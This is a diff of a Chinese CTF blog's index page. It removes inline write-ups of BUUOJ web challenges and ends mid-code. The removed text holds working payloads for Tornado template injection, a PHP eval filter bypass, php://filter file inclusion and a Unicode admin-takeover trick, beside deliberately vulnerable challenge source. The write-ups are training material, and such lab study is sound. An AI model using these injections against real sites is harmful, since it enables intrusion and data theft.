@@ -220,7 +220,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-27 03:06:09" itemprop="dateModified" datetime="2020-07-27T03:06:09+08:00">2020-07-27</time>
+                <time title="修改时间：2020-07-27 14:24:07" itemprop="dateModified" datetime="2020-07-27T14:24:07+08:00">2020-07-27</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -243,127 +243,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Week-2-lt-2020-07-20-2020-07-26-gt"><a href="#Week-2-lt-2020-07-20-2020-07-26-gt" class="headerlink" title="Week 2 &lt;2020.07.20 - 2020.07.26&gt;"></a>Week 2 &lt;2020.07.20 - 2020.07.26&gt;</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开页面有三个链接：</p>
-<p>/flag.txt</p>
-<p>/welcome.txt</p>
-<p>/hints.txt</p>
-<p>分别给出：</p>
-<p>flag in /fllllllllllllag</p>
-<p>render</p>
-<p>md5(cookie_secret+md5(filename))</p>
-<p>结合URL特征：<a href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=3f454049785f959f97757dbebee486b8" target="_blank" rel="noopener">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=3f454049785f959f97757dbebee486b8</a></p>
-<p>可以推断出payload：filename = /fllllllllllllag并且filehash = md5(cookie_secret+md5(filename))</p>
-<p>目标是取得cookie_secret</p>
-<p>试着用错误的filehash读一下，有报错页面</p>
-<p><a href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=Error" target="_blank" rel="noopener">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=Error</a></p>
-<p>判断是SSTI模板注入<br>payload：<br><a href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=" target="_blank" rel="noopener">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=</a>1<br>的确是SSTI注入</p>
-<p>考点：handler.settings对象</p>
-<blockquote>
-<p>tornado中<br>handler对象指向RequestHandler<br>RequestHandler指向self.application.settings<br>故handler.setting对象指向RequestHandler.application.settings</p>
-</blockquote>
-<p>则可获取到cookie_secret</p>
-<p>payload：<a href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=" target="_blank" rel="noopener">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;48ebd54e-1647-4fc6-beee-ce1cefb446c6&#39;&#125;</span><br></pre></td></tr></table></figure>
-<p>编写解密脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename=<span class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret=<span class="string">"48ebd54e-1647-4fc6-beee-ce1cefb446c6"</span></span><br><span class="line">hash.update(filename.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">s1=hash.hexdigest()</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.update((cookie_secret+s1).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2e43f158934b47a48cb9f125b554173</span><br></pre></td></tr></table></figure>
-<p>payload：<br><a href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=d2e43f158934b47a48cb9f125b554173" target="_blank" rel="noopener">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=d2e43f158934b47a48cb9f125b554173</a></p>
-<p>flag{056f8da6-43bc-491e-b37d-6ffd146a6287}</p>
-<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>过程很简单，打开网页查看源代码：</p>
-<table>
-<thead>
-<tr>
-<th>&lt;!–</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td>$cat=$_GET[‘cat’];</td>
-</tr>
-<tr>
-<td></td>
-<td>echo $cat;</td>
-</tr>
-<tr>
-<td></td>
-<td>if($cat==’dog’){</td>
-</tr>
-<tr>
-<td></td>
-<td>echo ‘Syc{cat_cat_cat_cat}’;</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>–&gt;</td>
-</tr>
-</tbody></table>
-<p>payload：<a href="http://40c9cea3-f867-4b85-a444-218c3812204d.node3.buuoj.cn/?cat=dog" target="_blank" rel="noopener">http://40c9cea3-f867-4b85-a444-218c3812204d.node3.buuoj.cn/?cat=dog</a></p>
-<p>结束</p>
-<p>flag{a1a1a5b3-e28f-4403-8ccd-9b8ab4a73686}</p>
-<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源代码：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">"#result"</span>).html(<span class="string">`&lt;div class="alert alert-success"&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>查看一下calc.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>绕过方法：php字符串解析特性，在num参数前加空格就可以绕过waf</p>
-<p>扫描目录：payload：<a href="http://node3.buuoj.cn:28534/calc.php？%20num=1;var_dump(scandir(chr(47)" target="_blank" rel="noopener">http://node3.buuoj.cn:28534/calc.php？%20num=1;var_dump(scandir(chr(47)</a>))</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1array(24) &#123; [0]&#x3D;&gt; string(1) &quot;.&quot; [1]&#x3D;&gt; string(2) &quot;..&quot; [2]&#x3D;&gt; string(10) &quot;.dockerenv&quot; [3]&#x3D;&gt; string(3) &quot;bin&quot; [4]&#x3D;&gt; string(4) &quot;boot&quot; [5]&#x3D;&gt; string(3) &quot;dev&quot; [6]&#x3D;&gt; string(3) &quot;etc&quot; [7]&#x3D;&gt; string(5) &quot;f1agg&quot; [8]&#x3D;&gt; string(4) &quot;home&quot; [9]&#x3D;&gt; string(3) &quot;lib&quot; [10]&#x3D;&gt; string(5) &quot;lib64&quot; [11]&#x3D;&gt; string(5) &quot;media&quot; [12]&#x3D;&gt; string(3) &quot;mnt&quot; [13]&#x3D;&gt; string(3) &quot;opt&quot; [14]&#x3D;&gt; string(4) &quot;proc&quot; [15]&#x3D;&gt; string(4) &quot;root&quot; [16]&#x3D;&gt; string(3) &quot;run&quot; [17]&#x3D;&gt; string(4) &quot;sbin&quot; [18]&#x3D;&gt; string(3) &quot;srv&quot; [19]&#x3D;&gt; string(8) &quot;start.sh&quot; [20]&#x3D;&gt; string(3) &quot;sys&quot; [21]&#x3D;&gt; string(3) &quot;tmp&quot; [22]&#x3D;&gt; string(3) &quot;usr&quot; [23]&#x3D;&gt; string(3) &quot;var&quot; &#125;</span><br></pre></td></tr></table></figure>
-
-<p>flag在“flagg”中<br>payload：<a href="http://node3.buuoj.cn:28534/calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)" target="_blank" rel="noopener">http://node3.buuoj.cn:28534/calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</a>))</p>
-<p>flag{55af2ea6-292a-452b-b89b-223b3b2a4561}</p>
-<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开网站，查看源代码：（27行）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id&#x3D;&quot;master&quot; href&#x3D;&quot;.&#x2F;Archive_room.php&quot; style&#x3D;&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>发现一个隐藏链接，进入</p>
-<p><img src="/2020/07/26/week20200720-20200726/image-20200726161728627.png" alt="image-20200726161728627"></p>
-<p>点击跳转到了end.php，但是查看源代码发现该链接目标是”<a href="view-source:http://adb61f74-015f-4f39-be21-ee11ec36a0cc.node3.buuoj.cn/action.php">./action.php</a>“ </p>
-<p>推断action.php自动跳转到了end.php</p>
-<p>BurpSuite抓包：</p>
-<p><img src="/2020/07/26/week20200720-20200726/image-20200726161711389.png" alt="image-20200726161711389"></p>
-<p>发现 secr3t.php 内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;    &lt;title&gt;secret&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file&#x3D;$_GET[&#39;file&#39;];    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/07/26/week20200720-20200726/image-20200726161601390.png" alt="image-20200726161601390"></p>
-<p>看不到。。</p>
-<p>分析secr3t.php文件包含漏洞，有若干过滤</p>
-<p>绕过 ：</p>
-<p><a href="http://00b5c733-809a-4aed-a498-27d306b09452.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php" target="_blank" rel="noopener">secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</a></p>
-<p>获得base64加密：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MGE4MjIyZjctN2U2Ni00Y2JlLWE1ZGYtMWEyNTJjOGIxMjU3fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;</span><br></pre></td></tr></table></figure>
-
-<p>解密找到flag</p>
-<p>flag{0a8222f7-7e66-4cbe-a5df-1a252c8b1257}</p>
-<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>启动有登录注册页面，随便注册一个账号登入，开始检查源代码，</p>
-<p>发现<!-- you are not admin -->，确认是要登入到admin账户</p>
-<p>在change password页面发现了源码github地址<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
-<p>已知解法：</p>
-<ol>
-<li><p>flask session 伪造</p>
-</li>
-<li><p>unicode欺骗</p>
-</li>
-<li><p>条件竞争</p>
-</li>
-</ol>
-<h3 id="flask-session-伪造："><a href="#flask-session-伪造：" class="headerlink" title="flask session 伪造："></a>flask session 伪造：</h3><h3 id="unicode欺骗："><a href="#unicode欺骗：" class="headerlink" title="unicode欺骗："></a>unicode欺骗：</h3><p>源码片段：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/register', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'image'</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">'Wrong verify code.'</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title = <span class="string">'register'</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">'The username has been registered'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'register successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title = <span class="string">'register'</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">'Invalid username or password'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, title = <span class="string">'login'</span>, form = form)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure>
-
-<p>三者都包含strlower()方法</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)	<span class="comment">#突破点</span></span><br><span class="line">    <span class="keyword">return</span> usernamenode</span><br></pre></td></tr></table></figure>
-
-<p>此处的nodeprep.prepare()方法存在unicode欺骗漏洞，将修饰字符转换为大写字符，大写字符转换为小写字符</p>
-<p>也就有ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</p>
-<p>所以只需要完成两次转换就可以将用户名为ᴬᴰᴹᴵᴺ的账户转换为admin账户</p>
-<p>使用注册为ᴬᴰᴹᴵᴺ的账户登录，再修改密码，则被处理为admin账户修改密码，然后再登录admin</p>
-<p>获得flag；</p>
-<h3 id="条件竞争："><a href="#条件竞争：" class="headerlink" title="条件竞争："></a>条件竞争：</h3><p>flag{b7342597-7fc6-4146-98ab-b4c1443ce753}</p>
-<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2>
+          <h1 id="Week-2-lt-2020-07-20-2020-07-26-gt"><a href="#Week-2-lt-2020-07-20-2020-07-26-gt" class="headerlink" title="Week 2 &lt;2020.07.20 - 2020.07.26&gt;"></a>Week 2 &lt;2020.07.20 - 2020.07.26&gt;</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/07/26/week20200720-20200726/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -413,7 +301,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-26 17:26:52" itemprop="dateModified" datetime="2020-07-26T17:26:52+08:00">2020-07-26</time>
+                <time title="修改时间：2020-07-27 14:23:55" itemprop="dateModified" datetime="2020-07-27T14:23:55+08:00">2020-07-27</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -436,101 +324,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Week-1-lt-2020-07-13-2020-07-19-gt"><a href="#Week-1-lt-2020-07-13-2020-07-19-gt" class="headerlink" title="Week 1 &lt;2020.07.13 - 2020.07.19&gt;"></a>Week 1 &lt;2020.07.13 - 2020.07.19&gt;</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开实例，只有一张图片，右键查看网页代码：</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>&lt;!DOCTYPE html&gt;</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td>&lt;html lang=”en”&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;head&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;meta charset=”UTF-8”&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;meta name=”viewport” content=”width=device-width, initial-scale=1.0”&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;meta http-equiv=”X-UA-Compatible” content=”ie=edge”&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;title&gt;Document&lt;/title&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;/head&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;body&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;!–source.php–&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;br&gt;&lt;img src=”<a href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg" target="_blank" rel="noopener">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</a>“ /&gt;&lt;/body&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;/html&gt;</td>
-</tr>
-</tbody></table>
-<p>可以获得source.php代码：<br>payload: <a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        </span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];  <span class="comment">// $whitelist</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;  <span class="comment">// $page is string</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(  <span class="comment">// 截取"?"前的字符串</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            